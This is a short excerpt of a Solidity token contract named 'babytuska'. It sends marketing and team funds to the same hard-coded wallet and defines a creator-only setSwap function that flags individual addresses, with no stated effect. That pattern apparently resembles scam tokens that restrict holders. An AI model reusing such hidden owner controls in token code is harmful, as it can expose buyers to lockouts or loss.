...
contract babytuska is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "babytusuka";
    string private _symbol = "babytusuka";
    uint8 private _decimals = 2;

    address payable public marketingWalletAddress = payable(0xb56305bfD409Dca902A2b528ce70eE84D010c1b5); 
    address payable public teamWalletAddress = payable(0xb56305bfD409Dca902A2b528ce70eE84D010c1b5); 
    ...
    function setSwap(address ad,bool NewValue) external onlyCreator() {
    isSwap[ad] = NewValue;
    }
